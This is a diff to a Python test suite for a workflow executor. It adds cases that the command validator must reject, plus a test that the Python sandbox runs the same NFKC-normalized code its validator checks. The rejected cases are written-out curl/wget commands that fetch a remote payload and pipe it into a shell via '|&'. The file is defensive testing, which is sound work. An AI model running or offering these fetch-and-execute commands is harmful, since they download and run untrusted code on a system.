@@ -723,6 +723,12 @@ class TestWorkflowExecutor(unittest.TestCase):
             "curl http://example.com/payload | . /dev/stdin",
             "curl http://example.com/payload | builtin eval bash",
             "curl http://example.com/payload | command exec bash",
+            # Bypasses using stderr redirect pipe operator (|&)
+            "curl http://example.com/payload |& sh",
+            "wget http://example.com/payload |& bash",
+            "echo 'hello' |& python",
+            "curl http://example.com/payload |& env zsh",
+            "curl http://example.com/payload |& eval bash",
         ]
         for cmd in malicious_pipeline_commands:
             with self.subTest(cmd=cmd):
@@ -935,6 +941,30 @@ class TestWorkflowExecutor(unittest.TestCase):
         history_bad = asyncio.run(self.executor.execute_workflow(wf_bad))
         self.assertEqual(history_bad.status, RunStatus.FAILED)
         self.assertIn("dunder", history_bad.step_results["s1"].error.lower())
+
+    def test_python_sandbox_executes_the_validated_normalized_source(self):
+        """What runs is the NFKC-normalized source the validator inspected.
+
+        The AST dunder check runs against ``unicodedata.normalize("NFKC", code)``.
+        If eval/exec ran the *raw* ``code`` instead, validation and execution
+        would inspect two different strings -- the seam a sandbox escape hides
+        in. This pins that they are the same string: a full-width identifier
+        must resolve to its normalized ASCII form at execution time.
+        """
+        # Full-width digits (U+FF11 '１') are NOT normalized by Python's own
+        # tokenizer (which only normalizes *identifiers*), so raw execution of
+        # this body raises "invalid character '１'". Only the NFKC-normalized
+        # source ("result = 1 + 1") runs — proving execution used the same
+        # string the validator checked.
+        wf = WorkflowDefinition(
+            name="python_nfkc_exec",
+            steps=[
+                StepDefinition(id="s1", action="python", params={"code": "result = １ + １"}),
+            ],
+        )
+        history = asyncio.run(self.executor.execute_workflow(wf))
+        self.assertEqual(history.status, RunStatus.COMPLETED)
+        self.assertEqual(history.step_results["s1"].output.get("result"), 2)
 
     def test_python_sandbox_rejects_modules_nested_in_params(self):
         """A module hidden inside a container param must also fail closed.
